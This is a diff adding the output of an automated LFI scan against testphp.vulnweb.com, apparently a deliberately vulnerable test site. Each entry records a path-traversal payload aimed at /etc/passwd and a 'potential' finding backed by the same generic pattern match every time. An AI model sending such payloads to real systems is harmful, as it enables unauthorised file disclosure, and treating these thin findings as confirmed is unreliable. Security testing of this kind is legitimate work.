@@ -1,0 +1,38 @@
+LFI Vulnerability Scan Results
+=======================================
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=2
+Parameter: cat
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=3
+Parameter: cat
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=4
+Parameter: cat
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testphp.vulnweb.com?pp=12
+Parameter: pp
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
